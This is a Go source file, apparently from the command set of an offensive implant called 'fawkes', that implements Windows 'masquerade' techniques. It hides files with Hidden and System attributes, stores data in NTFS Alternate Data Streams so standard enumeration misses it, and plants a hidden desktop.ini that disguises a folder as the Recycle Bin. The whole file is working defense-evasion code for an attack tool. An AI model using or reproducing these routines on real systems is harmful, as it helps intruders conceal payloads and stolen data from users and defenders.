//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

// masqueradeHide hides a file/directory on Windows using filesystem attributes.
// Sets +Hidden and +System attributes (items hidden from Explorer and dir).
func masqueradeHide(path string) structs.CommandResult {
	info, err := os.Stat(path)
	if err != nil {
		return errorf("Error: path not found: %v", err)
	}

	var actions []string

	// Get current attributes
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	attrs, err := syscall.GetFileAttributes(pathPtr)
	if err != nil {
		return errorf("Error getting attributes: %v", err)
	}

	// Set Hidden + System attributes
	newAttrs := attrs | syscall.FILE_ATTRIBUTE_HIDDEN | syscall.FILE_ATTRIBUTE_SYSTEM
	if err := syscall.SetFileAttributes(pathPtr, newAttrs); err != nil {
		return errorf("Error setting hidden attributes: %v", err)
	}
	actions = append(actions, "Set +Hidden +System attributes")

	typeStr := "file"
	if info.IsDir() {
		typeStr = "directory"
	}

	return successf("[+] Hidden %s: %s\n%s", typeStr, path, strings.Join(actions, "\n"))
}

// masqueradeUnhide clears Hidden and System attributes on Windows.
func masqueradeUnhide(path string) structs.CommandResult {
	_, err := os.Stat(path)
	if err != nil {
		return errorf("Error: path not found: %v", err)
	}

	pathPtr, _ := syscall.UTF16PtrFromString(path)
	attrs, err := syscall.GetFileAttributes(pathPtr)
	if err != nil {
		return errorf("Error getting attributes: %v", err)
	}

	// Clear Hidden and System bits
	newAttrs := attrs &^ (syscall.FILE_ATTRIBUTE_HIDDEN | syscall.FILE_ATTRIBUTE_SYSTEM)
	if err := syscall.SetFileAttributes(pathPtr, newAttrs); err != nil {
		return errorf("Error clearing attributes: %v", err)
	}

	return successf("[+] Unhidden: %s\nCleared Hidden+System attributes", path)
}

// masqueradeADS writes data to an NTFS Alternate Data Stream.
// The data is hidden from standard file enumeration.
func masqueradeADS(hostPath, streamName string, data []byte) structs.CommandResult {
	if streamName == "" {
		return errorResult("Error: stream name required for ads technique")
	}

	adsPath := hostPath + ":" + streamName

	// Write data to ADS
	if err := os.WriteFile(adsPath, data, 0644); err != nil {
		return errorf("Error writing ADS %s: %v", adsPath, err)
	}

	return successf("[+] NTFS ADS created: %s\n  Host file: %s\n  Stream: %s\n  Size: %d bytes",
		adsPath, hostPath, streamName, len(data))
}

// masqueradeDesktopINI creates a desktop.ini to disguise a folder's icon/type via CLSID.
func masqueradeDesktopINI(folderPath, clsid string) structs.CommandResult {
	info, err := os.Stat(folderPath)
	if err != nil || !info.IsDir() {
		return errorResult("Error: path must be an existing directory")
	}

	if clsid == "" {
		clsid = "{645FF040-5081-101B-9F08-00AA002F954E}" // Recycle Bin
	}

	iniContent := fmt.Sprintf("[.ShellClassInfo]\nCLSID2=%s\n", clsid)
	iniPath := filepath.Join(folderPath, "desktop.ini")

	if err := os.WriteFile(iniPath, []byte(iniContent), 0644); err != nil {
		return errorf("Error writing desktop.ini: %v", err)
	}

	// Set desktop.ini as hidden+system
	iniPtr, _ := syscall.UTF16PtrFromString(iniPath)
	_ = syscall.SetFileAttributes(iniPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)

	// Set folder as system (required for desktop.ini to take effect)
	folderPtr, _ := syscall.UTF16PtrFromString(folderPath)
	folderAttrs, _ := syscall.GetFileAttributes(folderPtr)
	_ = syscall.SetFileAttributes(folderPtr, folderAttrs|syscall.FILE_ATTRIBUTE_SYSTEM)

	return successf("[+] Desktop.ini disguise applied to: %s\n  CLSID: %s\n  desktop.ini: %s (hidden+system)",
		folderPath, clsid, iniPath)
}
